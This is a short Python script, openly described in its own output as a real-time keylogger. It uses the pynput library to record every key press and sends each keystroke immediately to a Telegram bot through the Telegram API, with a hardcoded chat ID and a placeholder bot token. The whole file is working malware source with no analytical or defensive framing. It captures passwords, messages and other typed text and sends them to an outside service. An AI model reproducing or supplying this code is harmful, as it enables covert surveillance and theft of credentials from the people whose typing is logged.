import pynput.keyboard
import requests
import threading

# --- Configuration ---
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"    #your bot token comes here
TELEGRAM_CHAT_ID = "2093874577"

# --- Functions ---
def send_key_to_telegram(key_data):
    """Sends a single key event to the Telegram bot."""
    # Construct the Telegram API URL for sending a message
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    # Prepare the message payload
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": key_data
    }
    
    try:
        # Send the message
        requests.post(url, data=payload)
    except requests.exceptions.RequestException as e:
        # Print an error if sending fails
        print(f"Failed to send key: {e}")

def on_key_press(key):
    """Callback function for key presses."""
    try:
        # For alphanumeric keys, get the character
        char = key.char
        key_data = char
    except AttributeError:
        # For special keys, append a descriptive string
        if key == pynput.keyboard.Key.space:
            key_data = " "
        elif key == pynput.keyboard.Key.enter:
            key_data = "\n"
        else:
            key_data = f"[{str(key).split('.')[-1].upper()}]"

    # Send the key data immediately in a new thread
    threading.Thread(target=send_key_to_telegram, args=(key_data,)).start()

def start_listener():
    """Starts the keyboard listener."""
    with pynput.keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

# --- Main Execution ---
if __name__ == "__main__":
    print("Starting real-time keylogger...")
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.start()
    
    # Keep the main thread alive
    listener_thread.join()
